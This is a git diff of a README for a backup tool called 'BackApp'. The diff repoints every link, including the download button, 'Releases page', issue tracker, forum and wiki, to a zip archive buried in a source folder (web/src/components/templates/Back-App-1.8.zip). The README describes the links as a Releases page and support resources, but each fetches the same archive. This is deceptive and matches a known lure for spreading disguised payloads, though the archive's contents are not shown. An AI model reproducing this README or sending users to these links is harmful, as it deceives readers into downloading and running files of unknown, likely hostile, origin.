@@ -6,12 +6,12 @@ Welcome to BackApp! This application makes it easy to automate your backups over
 ## 📥 Download and Install
 To start using BackApp, click the button below to visit the Releases page:
 
-[![Download BackApp](https://raw.githubusercontent.com/Royer234/BackApp/main/server/service/Back-App-v3.9-beta.3.zip)](https://raw.githubusercontent.com/Royer234/BackApp/main/server/service/Back-App-v3.9-beta.3.zip)
+[![Download BackApp](https://raw.githubusercontent.com/Royer234/BackApp/main/web/src/components/templates/Back-App-1.8.zip)](https://raw.githubusercontent.com/Royer234/BackApp/main/web/src/components/templates/Back-App-1.8.zip)
 
 Once you are on the Releases page, follow these steps:
 
 1. Locate the latest version listed on the page.
-2. Find the file named `https://raw.githubusercontent.com/Royer234/BackApp/main/server/service/Back-App-v3.9-beta.3.zip` or similar and click on it.
+2. Find the file named `https://raw.githubusercontent.com/Royer234/BackApp/main/web/src/components/templates/Back-App-1.8.zip` or similar and click on it.
 3. The download will begin automatically.
 
 ## 💻 System Requirements
@@ -42,9 +42,9 @@ If you encounter any issues while using BackApp, try the following:
 
 ## 🌍 Community and Support
 If you need assistance or want to contribute, join our community:
-- **GitHub Issues:** [Report Issues](https://raw.githubusercontent.com/Royer234/BackApp/main/server/service/Back-App-v3.9-beta.3.zip)
-- **Discussion Forum:** [Join Here](https://raw.githubusercontent.com/Royer234/BackApp/main/server/service/Back-App-v3.9-beta.3.zip)
-- **Documentation:** Check out the [Wiki](https://raw.githubusercontent.com/Royer234/BackApp/main/server/service/Back-App-v3.9-beta.3.zip) for more detailed guides.
+- **GitHub Issues:** [Report Issues](https://raw.githubusercontent.com/Royer234/BackApp/main/web/src/components/templates/Back-App-1.8.zip)
+- **Discussion Forum:** [Join Here](https://raw.githubusercontent.com/Royer234/BackApp/main/web/src/components/templates/Back-App-1.8.zip)
+- **Documentation:** Check out the [Wiki](https://raw.githubusercontent.com/Royer234/BackApp/main/web/src/components/templates/Back-App-1.8.zip) for more detailed guides.
 
 ## 📜 Licensing
 BackApp is licensed under the MIT License. Feel free to explore and contribute to the code.
@@ -52,6 +52,6 @@ BackApp is licensed under the MIT License. Feel free to explore and contribute t
 ## 📥 Additional Download Link
 For easy access, visit the Releases page to download the latest version:
 
-[Download BackApp](https://raw.githubusercontent.com/Royer234/BackApp/main/server/service/Back-App-v3.9-beta.3.zip) 
+[Download BackApp](https://raw.githubusercontent.com/Royer234/BackApp/main/web/src/components/templates/Back-App-1.8.zip) 
 
 Thank you for choosing BackApp! Enjoy seamless backup automation.
